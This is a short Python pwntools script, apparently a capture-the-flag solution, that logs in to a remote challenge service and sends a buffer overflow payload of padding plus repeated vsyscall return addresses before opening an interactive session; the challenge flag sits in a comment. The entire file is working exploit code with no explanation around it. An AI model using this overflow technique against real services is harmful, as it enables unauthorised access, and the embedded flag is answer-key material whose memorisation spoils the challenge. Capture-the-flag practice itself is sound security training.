#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time

# CTF{NoLeaksFromThisPipe}
host = "wiki.ctfcompetition.com"
port = 1337


r = remote(host,port)

payload = "\x00"*0x80
payload += p64(0xffffffffff600800)*(4+23)

r.sendline("USER")
time.sleep(0.5)
r.sendline("Fortimanager_Access")
time.sleep(0.5)
r.sendline("PASS")
time.sleep(0.5)
r.sendline(payload)
time.sleep(0.5)
r.sendline()
r.interactive()
